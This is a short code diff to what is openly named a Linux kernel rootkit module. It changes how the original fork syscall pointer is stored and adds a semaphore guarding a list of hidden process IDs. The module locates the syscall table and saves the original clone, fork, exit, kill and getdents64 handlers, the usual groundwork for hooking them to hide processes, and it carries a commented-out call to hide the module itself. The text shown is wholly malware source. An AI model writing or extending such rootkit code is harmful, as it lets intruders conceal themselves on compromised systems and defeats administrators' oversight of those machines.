@@ -3,11 +3,13 @@
 static unsigned long *syscall_table;
 
 asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
-asmlinkage long (*orig_fork)(void);
+sys_call_stub orig_fork;
 sys_call_stub orig_exit;
 sys_call_stub orig_exit_group;
 sys_call_stub orig_kill;
 sys_call_stub orig_getdents64;
+
+struct semaphore hidden_pid_list_sem;
 
 static int __init lkm_rootkit_init(void)
 {
@@ -21,12 +23,13 @@ static int __init lkm_rootkit_init(void)
     }
 
     // module_hide();
+    sema_init(&hidden_pid_list_sem, 1);
 
     syscall_table = find_syscall_table();
     FM_INFO("Found syscall_table at %lx\n", *syscall_table);
 
     orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
-    orig_fork = (asmlinkage long (*)(void))syscall_table[__NR_fork];
+    orig_fork = (sys_call_stub)syscall_table[__NR_fork];
     orig_exit = (sys_call_stub)syscall_table[__NR_exit];
     orig_exit_group = (sys_call_stub)syscall_table[__NR_exit_group];
     orig_kill = (sys_call_stub)syscall_table[__NR_kill];
